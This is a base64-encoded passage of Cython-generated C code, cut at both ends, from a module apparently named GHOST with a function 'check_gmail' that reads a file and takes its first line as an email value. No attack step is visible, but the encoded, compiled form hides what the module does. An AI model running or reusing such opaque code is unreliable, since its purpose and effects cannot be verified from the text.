lrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTIzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9HZXRJdGVtSW50X0xpc3QoX19weXhfdF82LCAwLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAxLCAwLCAxLCAxLCBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX093blN0cm9uZ1JlZmVyZW5jZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDEyMywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X2VtYWlsLCBfX3B5eF90XzUpO1xuICAgICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICAgIFxuICAgICAgfVxuXG4gICAgICBcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfOCwgJl9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgICB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICAge1xuICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF9idWlsdGluX29wZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMTBfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMTBfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgICAgICBfX3B5eF90XzExID0gTlVMTDtcbiAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDE2X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgX19weXhfdF8xMyA9IDE7XG4gICAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgICAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTIpKSkge1xuICAgICAgICAgICAgICBfX3B5eF90XzExID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMik7XG4gICAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEyKTtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEyLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAge1xuICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgTlVMTH07XG4gICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF8xMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoX19weXhfdF8xMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDE2X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX3B5eF90XzY7XG4gICAgICAgICAgICBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAge1xuICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzE0LCAmX19weXhfdF8xNSwgJl9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICBfX3B5eF92X2YgPSBfX3B5eF90XzEyO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8xMiA9IDA7XG5cbiAgICAgICAgICAgICAgICAgIFxuICAgICAgICAgICAgICAgICAgX19weXhfdF8xMSA9IF9fcHl4X3ZfZjtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgTlVMTH07XG4gICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlYWQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMjcsIF9fcHl4X0wyMF9lcnJvcilcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSBfX3B5eF90XzY7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTtcbiAgICAgICAgICAgICAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0bGluZXMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxMjcsIF9fcHl4X0wyMF9lcnJvcilcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfR2V0SXRlbUludChfX3B5eF90XzEyLCAwLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAwLCAwLCAxLCAxLCBfX1B5eF9SZWZlcmVuY2VTaGFyaW5nX093blN0cm9uZ1JlZmVyZW5jZSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEyNywgX19weXhfTDIwX2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgICAgICAgICAgX19weXhfdl9vID0gX19weXhfdF82O1xuICAgICAgICAgICAgICAgICAgX19weXhfdF82ID0gMDtcblxuICAgICAgICAgICAgICAgICAgXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNSk7IF9fcHl4X3RfMTUgPSAwO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDI1X3RyeV9lbmQ7XG4gICAgICAgICAgICAgICAgX19weXhfTDIwX2Vycm9yOjtcbiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULmNoZWNrX2dtYWlsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICAgICAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzYsICZfX3B5eF90XzEyLCAmX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wyMl9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8xMSA9IFB5VHVwbGVfUGFjaygzLCBfX3B5eF90XzYsIF9fcHl4X3RfMTIsIF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wyMl9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzE3ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEwLCBfX3B5eF90XzExLCBOVUxMKTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDIyX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE3KTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICAgICAgICAgICAgICBpZiAoX19weXhfdF80IDwgKDApKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMjJfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICAgICAgX19weXhfdF8xOCA9ICghX19weXhfdF80KTtcbiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzE4KSkge1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xMik7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF82LCBfX3B5eF90XzEyLCBfX3B5eF90XzUpO1xuICAgICAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSAwOyAgX19weXhfdF8xMiA9IDA7ICBfX3B5eF90XzUgPSAwOyBcbiAgICAgICAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDIyX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICAgICAgZ290byBfX3B5eF9MMjFfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIF9fcHl4X0wyMl9leGNlcHRfZXJyb3I6O1xuICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgICAgIGdvdG8gX19weXhfTDEwX2Vycm9yO1xuICAgICAgICAgICAgICAgIF9fcHl4X0wyMV9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xNCwgX19weXhfdF8xNSwgX19weXhfdF8xNik7XG4gICAgICAgICAgICAgICAgX19weXhfTDI1X3RyeV9lbmQ6O1xuICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAge1xuICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfMTApIHtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdLCBOVUxMKTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMTBfZXJyb3IpXG4gICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wxOTtcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICBfX3B5eF9MMTk6O1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgZ290byBfX3B5eF9MMjk7XG4gICAgICAgICAgICBfX3B5eF9MMTZfZXJyb3I6O1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIGdvdG8gX19weXhfTDEwX2Vycm9yO1xuICAgICAgICAgICAgX19weXhfTDI5OjtcbiAgICAgICAgICB9XG5cbiAgICAgICAgICBcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBnb3RvIF9fcHl4X0wxNV90cnlfZW5kO1xuICAgICAgICBfX3B5eF9MMTBfZXJyb3I6O1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgICAgIFxuICAgICAgICAge1xuICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuY2hlY2tfZ21haWwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzEyLCAmX19weXhfdF82KSA8IDApIF9fUFlYX0VSUigwLCAxMjgsIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMik7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgIHtcbiAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X2J1aWx0aW5fb3BlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTI5LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTI5LCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgICAgX19weXhfdF8yMCA9IE5VTEw7XG4gICAgICAgICAgICBfX3B5eF90XzIxID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgMTI5LCBfX3B5eF9MMzJfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7XG4gICAgICAgICAgICBfX3B5eF90XzEzID0gMTtcbiAgICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgICAgICAgIGlmIChsaWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8yMSkpKSB7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMjAgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzIxKTtcbiAgICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMjApO1xuICAgICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMjEpO1xuICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yMCk7XG4gICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMjEsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIwLCBOVUxMfTtcbiAgICAgICAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF8yMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoX19weXhfdF8xMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAxMjksIF9fcHl4X0wzMl9lcnJvcilcbiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19weXhfdF8yMSA9IF9fcHl4X3RfMTk7XG4gICAgICAgICAgICBfX3B5eF90XzE5ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgICAgICAge1xuICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzE2LCAmX19weXhfdF8xNSwgJl9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNik7XG4gICAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X2YsIF9fcHl4X3RfMjEpO1xuICAgICAgICAgICAgICAgICAgX19weXhfdF8yMSA9IDA7XG5cbiAgICAgICAgICAgICAgICAgIFxuICAgICAgICAgICAgICAgICAgX19weXhfdF8yMCA9IF9fcHl4X3ZfZjtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIwKTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yMCwgTlVMTH07XG4gICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWFkLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApOyBfX3B5eF90XzIwID0gMDtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE5KSkgX19QWVhfRVJSKDAsIDEzMCwgX19weXhfTDM4X2Vycm9yKVxuICAgICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICBfX3B5eF90XzExID0gX19weXhfdF8xOTtcbiAgICAgICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzExKTtcbiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgTlVMTH07XG4gICAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMjEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdGxpbmVzLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMS1fX3B5eF90XzEzKSB8